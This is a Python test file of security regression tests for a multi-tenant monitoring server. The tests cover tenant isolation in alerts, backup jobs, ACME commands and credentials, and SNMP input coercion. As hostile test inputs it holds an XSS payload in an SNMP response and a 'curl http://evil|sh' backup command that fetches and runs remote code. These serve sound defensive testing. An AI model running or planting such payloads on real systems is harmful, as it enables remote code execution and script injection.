"""v6.3.0 pre-release security hunt — cross-tenant/scope isolation + SNMP XSS.

Six findings from the v6.3.0 adversarial audit (all pre-existing, confirmed
against the code, none v6.3.0 regressions). A tenant admin resolves to role
'admin' with role scope None, so any handler that gates on `_caller_scope()`
alone (or `_device_in_scope(None, dev)`, which is always True) and is NOT under
/api/devices/<id>/ — where `_enforce_device_scope` would catch it — leaked or
mutated across tenants.

Tests stub ONLY identity (`verify_token` + `_caller_effective_tenant`); the
handlers keep their real gates, so a test passes only if the gate is actually
present (a handler with NO gate would fail). Mirrors
test_v612_tenant_cmd_isolation.
"""
import importlib.util
import os
import sys
import tempfile
import unittest
from pathlib import Path

CGI = Path(__file__).resolve().parent.parent / 'server' / 'cgi-bin'
sys.path.insert(0, str(CGI))


def _fresh_api():
    os.environ['RP_DATA_DIR'] = tempfile.mkdtemp(prefix='rp-v630-sec-')
    spec = importlib.util.spec_from_file_location('api_v630_sec', CGI / 'api.py')
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class _TenantBase(unittest.TestCase):
    def setUp(self):
        self.api = _fresh_api()
        self.api.save(self.api.CONFIG_FILE, {'tenancy_enforced': True})
        self.api._LOAD_CACHE.clear()
        self.api.save(self.api.DEVICES_FILE, {
            'devA': {'name': 'A-host', 'tenant': 'tenantA', 'token': 'ta',
                     'version': '1.0', 'group': 'g', 'tags': ['prod'], 'ip': '10.0.0.1'},
            'devB': {'name': 'B-host', 'tenant': 'tenantB', 'token': 'tb',
                     'version': '2.0', 'group': 'g', 'tags': ['prod'], 'ip': '10.0.0.2'},
        })
        self.api.audit_log = lambda *a, **k: None
        self.api.get_token_from_request = lambda: 'x'
        self.cap = {}

        def _respond(s, d=None, headers=None):
            self.cap['s'] = s
            self.cap['d'] = d
            raise self.api.HTTPError(s, d)
        self.api.respond = _respond

    def _as(self, tenant, role='admin'):
        self.api.verify_token = lambda tok=None, _r=role: ('alice', _r)
        self.api.require_auth = lambda *a, **k: ('alice', role)
        self.api.require_admin_auth = lambda *a, **k: 'alice'
        self.api._caller_effective_tenant = lambda u, _t=tenant: _t
        self.api._caller_scope = lambda: None      # admin has no role scope


class TestAlertResolutionStatsIsolation(_TenantBase):
    """H3: GET /api/alerts/resolution-stats leaked cross-tenant MTTR + timeline."""

    def _seed(self):
        now = int(self.api.time.time())
        self.api.save(self.api.ALERTS_FILE, {'alerts': [
            {'id': 'a1', 'device_id': 'devA', 'event': 'service_down',
             'created': now - 300, 'resolved_at': now - 60, 'resolved_by': 'auto',
             'payload': {'device_name': 'A-host'}},
            {'id': 'a2', 'device_id': 'devB', 'event': 'service_down',
             'created': now - 300, 'resolved_at': now - 60, 'resolved_by': 'bob',
             'payload': {'device_name': 'B-host'}},
        ]})

    def _run(self):
        self.api.method = lambda: 'GET'
        self.api._env = lambda k, d='': 'days=30' if k == 'QUERY_STRING' else d
        try:
            self.api.handle_alert_resolution_stats()
        except (self.api.HTTPError, SystemExit):
            pass
        return self.cap.get('d') or {}

    def test_tenant_admin_sees_only_own_hosts(self):
        self._seed()
        self._as('tenantA')
        out = self._run()
        self.assertNotIn('devB', repr(out), 'cross-tenant MTTR leak')
        self.assertNotIn('B-host', repr(out), 'cross-tenant hostname/timeline leak')
        self.assertIn('devA', repr(out), 'own-tenant data must still show')

    def test_superadmin_sees_all(self):
        self._seed()
        self._as(self.api.DEFAULT_TENANT)
        out = self._run()
        blob = repr(out)
        self.assertIn('devA', blob)
        self.assertIn('devB', blob, 'superadmin must retain cross-tenant view')


class TestAlertTuningIsolation(_TenantBase):
    """M4: GET /api/alert-tuning leaked cross-tenant noisy-host/event stats."""

    def _seed(self):
        now = int(self.api.time.time())
        self.api.save(self.api.FLEET_EVENTS_FILE, {'events': [
            {'event': 'service_down', 'ts': now - 100,
             'payload': {'device_id': 'devA', 'device_name': 'A-host'}},
            {'event': 'service_down', 'ts': now - 100,
             'payload': {'device_id': 'devB', 'device_name': 'B-host'}},
        ]})

    def _run(self):
        self.api.method = lambda: 'GET'
        self.api._env = lambda k, d='': 'days=30' if k == 'QUERY_STRING' else d
        try:
            self.api.handle_alert_tuning()
        except (self.api.HTTPError, SystemExit):
            pass
        return self.cap.get('d') or {}

    def test_tenant_admin_tuning_scoped(self):
        self._seed()
        self._as('tenantA')
        out = self._run()
        blob = repr(out)
        self.assertNotIn('devB', blob, 'cross-tenant tuning host leak')
        self.assertNotIn('B-host', blob, 'cross-tenant tuning hostname leak')


class TestInheritedCredentialsIsolation(_TenantBase):
    """M5: GET /api/cmdb/<id>/inherited-credentials confirmed cross-tenant device
    + leaked scoped-credential metadata to a tenant admin."""

    def _run(self, dev_id):
        self.api.method = lambda: 'GET'
        try:
            self.api.handle_device_inherited_credentials(dev_id)
        except (self.api.HTTPError, SystemExit):
            pass
        return self.cap

    def test_cross_tenant_device_blocked(self):
        self._as('tenantA')
        self._run('devB')
        self.assertEqual(self.cap.get('s'), 403,
                         'tenant admin must be blocked from another tenant device')

    def test_own_device_allowed(self):
        self._as('tenantA')
        self.cap.clear()
        self._run('devA')
        self.assertEqual(self.cap.get('s'), 200)


class TestAcmeWriteIsolation(_TenantBase):
    """H1: the ACME write handlers (issue/renew/revoke/cancel) live under
    /api/acme/, so _enforce_device_scope never covered them; a tenant admin
    could queue an exec: on another tenant's host."""

    def test_queue_command_blocks_cross_tenant(self):
        self._as('tenantA')
        self.api.method = lambda: 'POST'
        self.api.save(self.api.CMDS_FILE, {})
        self.api._invalidate_load_cache(self.api.CMDS_FILE)
        try:
            self.api.handle_acme_force_renew('devB', 'example.com')
        except (self.api.HTTPError, SystemExit):
            pass
        cmds = self.api.load(self.api.CMDS_FILE) or {}
        self.assertNotIn('devB', cmds,
                         'CROSS-TENANT: ACME command queued on another tenant host')

    def test_queue_command_allows_same_tenant(self):
        self._as('tenantA')
        self.api.save(self.api.CMDS_FILE, {})
        self.api._invalidate_load_cache(self.api.CMDS_FILE)
        # A same-tenant queue should reach the CMDS store (the tenant gate lets
        # it through; the funnel is what issue/renew/revoke all share).
        try:
            self.api._acme_queue_command('devA', 'renew', 'example.com',
                                         'exec:#acme echo ok')
        except (self.api.HTTPError, SystemExit):
            pass
        cmds = self.api.load(self.api.CMDS_FILE) or {}
        self.assertIn('devA', cmds, 'same-tenant ACME command must still queue')


class TestSnmpUptimeCoercion(unittest.TestCase):
    """M6 (server half): sysUpTime coerced to int/None so a hostile SNMP
    responder can't return markup that reaches a UI sink. (The JS sinks also
    escape it now — verified separately.)"""

    @classmethod
    def setUpClass(cls):
        os.environ.setdefault('RP_DATA_DIR', tempfile.mkdtemp(prefix='rp-v630-snmp-'))
        import snmp
        cls.snmp = snmp

    def setUp(self):
        self._orig = self.snmp.snmp_get

    def tearDown(self):
        self.snmp.snmp_get = self._orig

    def test_octet_string_uptime_is_neutralized(self):
        oids = self.snmp.SYSTEM_OIDS
        raw = {oids['sysUpTime']: '<img src=x onerror=alert(1)>',
               oids['sysName']: 'sw1'}
        self.snmp.snmp_get = lambda *a, **k: raw
        out = self.snmp.poll_system('10.0.0.1', 'public')
        self.assertIsNone(out['sysUpTime'],
                          'non-integer sysUpTime must be coerced to None')

    def test_integer_uptime_preserved(self):
        oids = self.snmp.SYSTEM_OIDS
        self.snmp.snmp_get = lambda *a, **k: {oids['sysUpTime']: 123456}
        out = self.snmp.poll_system('10.0.0.1', 'public')
        self.assertEqual(out['sysUpTime'], 123456)


class TestBackupJobTenantIsolation(_TenantBase):
    """v6.3.0 pentest: backup jobs are device-keyed, so list/update/delete must
    tenant-gate (run/restore/archives already re-filter). Without the gate a
    tenant admin could read another tenant's job secrets, and edit its command/
    cron to reach cross-tenant root RCE via the cron sweep."""

    def _seed_job_for(self, dev):
        self.api.save(self.api.BACKUP_JOBS_FILE, {'jobs': [{
            'id': 'jA', 'name': 'nightly', 'type': 'command',
            'command': 'restic backup /etc --password-file /root/.pw',
            'device_ids': [dev], 'device_id': dev, 'enabled': True, 'cron': None}]})

    def test_list_hides_other_tenant_job(self):
        self._seed_job_for('devA')          # a tenantA job
        self._as('tenantB')
        try:
            self.api.handle_backup_jobs_list()
        except (self.api.HTTPError, SystemExit):
            pass
        jobs = (self.cap.get('d') or {}).get('jobs', [])
        self.assertEqual(jobs, [], 'tenant B must not see tenant A backup jobs')
        # and secrets in the command must not leak
        self.assertNotIn('password-file', repr(self.cap.get('d')))

    def test_list_shows_own_and_superadmin_sees_all(self):
        self._seed_job_for('devA')
        self._as('tenantA')
        try:
            self.api.handle_backup_jobs_list()
        except (self.api.HTTPError, SystemExit):
            pass
        self.assertEqual(len(((self.cap.get('d') or {}).get('jobs', []))), 1)
        self.cap.clear()
        self._as(self.api.DEFAULT_TENANT)
        try:
            self.api.handle_backup_jobs_list()
        except (self.api.HTTPError, SystemExit):
            pass
        self.assertEqual(len(((self.cap.get('d') or {}).get('jobs', []))), 1)

    def test_update_blocked_cross_tenant(self):
        self._seed_job_for('devA')
        self._as('tenantB')
        self.api.method = lambda: 'PUT'
        self.api.get_json_obj = lambda: {'command': 'curl http://evil|sh', 'cron': '* * * * *'}
        try:
            self.api.handle_backup_job_update('jA')
        except (self.api.HTTPError, SystemExit):
            pass
        self.assertEqual(self.cap.get('s'), 404)
        # the job's command must be UNCHANGED
        stored = (self.api.load(self.api.BACKUP_JOBS_FILE) or {}).get('jobs', [])[0]
        self.assertNotIn('evil', stored['command'])

    def test_delete_blocked_cross_tenant(self):
        self._seed_job_for('devA')
        self._as('tenantB')
        self.api.method = lambda: 'DELETE'
        try:
            self.api.handle_backup_job_delete('jA')
        except (self.api.HTTPError, SystemExit):
            pass
        self.assertEqual(self.cap.get('s'), 404)
        self.assertEqual(len((self.api.load(self.api.BACKUP_JOBS_FILE) or {}).get('jobs', [])), 1)


class TestDashboardTicketsIsolation(_TenantBase):
    """H2: the dashboard Tickets card (_dashboard_tickets) skipped filtering for a
    tenant admin (scope None), leaking every tenant's alerts."""

    def test_dashboard_tickets_scoped(self):
        now = int(self.api.time.time())
        self.api.save(self.api.ALERTS_FILE, {'alerts': [
            {'id': 'a1', 'device_id': 'devA', 'event': 'x', 'created': now,
             'payload': {'device_name': 'A-host'}},
            {'id': 'a2', 'device_id': 'devB', 'event': 'x', 'created': now,
             'payload': {'device_name': 'B-host'}},
        ]})
        self._as('tenantA')
        out = self.api._dashboard_tickets()
        self.assertNotIn('devB', repr(out), 'cross-tenant dashboard alert leak')


if __name__ == '__main__':
    unittest.main()
